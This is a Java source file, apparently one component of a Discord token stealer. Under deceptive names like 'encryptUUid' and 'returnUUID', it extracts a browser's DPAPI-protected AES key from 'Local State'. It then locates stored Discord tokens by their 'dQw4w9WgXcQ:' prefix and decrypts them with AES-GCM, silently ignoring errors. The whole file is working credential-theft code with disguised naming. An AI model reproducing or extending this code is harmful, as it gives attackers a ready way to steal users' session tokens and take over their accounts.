package xd.utils;

import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.File;
import java.io.FileInputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Paths;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.sun.jna.platform.win32.Crypt32Util;

public class a {
    private static final Pattern uuidRegex = Pattern.compile("dQw4w9WgXcQ:[^\"]*");

    public static Set<String> encryptUUid(String path, byte[] AESKey) {
        Set<String> decryptedTokens = new HashSet<>();

        for (byte[] decodedToken : getList(path)) {
            byte[] decryptedToken = new byte[12];
            System.arraycopy(decodedToken, 3, decryptedToken, 0, 12);
            byte[] encryptedData = new byte[decodedToken.length - 15];
            System.arraycopy(decodedToken, 15, encryptedData, 0, encryptedData.length);

            try {
                Cipher GCM = Cipher.getInstance("AES/GCM/NoPadding");

                GCM.init(
                        Cipher.DECRYPT_MODE,
                        new SecretKeySpec(AESKey, "AES"),
                        new GCMParameterSpec(128, decryptedToken)
                );

                decryptedTokens.add(new String(GCM.doFinal(encryptedData)));
            } catch (Exception ignored) {
            }
        }

        return decryptedTokens;
    }

    public static byte[] returnUUID(String path) {
        try {
            c localState = new c(Paths.get(path, "Local State"));

            String encodedAESKey = localState.valueOf("encrypted_key");
            byte[] decodedAESKey = Base64.getDecoder().decode(encodedAESKey);
            byte[] encryptedAESKey = Arrays.copyOfRange(decodedAESKey, 5, decodedAESKey.length);

            return Crypt32Util.cryptUnprotectData(encryptedAESKey);
        } catch (Exception ignored) {
        }

        return null;
    }

    private static List<byte[]> getList(String path) {
        List<byte[]> newTokens = new ArrayList<>();

        b.validAuths(path).forEach(file ->
            newTokens.addAll(recode(file))
        );

        return newTokens;
    }

    private static List<byte[]> recode(File file) {
        List<byte[]> decodedTokens = new ArrayList<>();

        try (Scanner tokenScanner = new Scanner(new FileInputStream(file), StandardCharsets.UTF_8)) {
            tokenScanner.forEachRemaining(line -> {
                Matcher tokenMatcher = uuidRegex.matcher(line);
                if (tokenMatcher.find()) {
                    String encodedToken = tokenMatcher.group().substring(12);
                    byte[] decodedToken = Base64.getDecoder().decode(encodedToken);
                    decodedTokens.add(decodedToken);
                }
            });
        } catch (Exception ignored) {
        }

        return decodedTokens;
    }
}
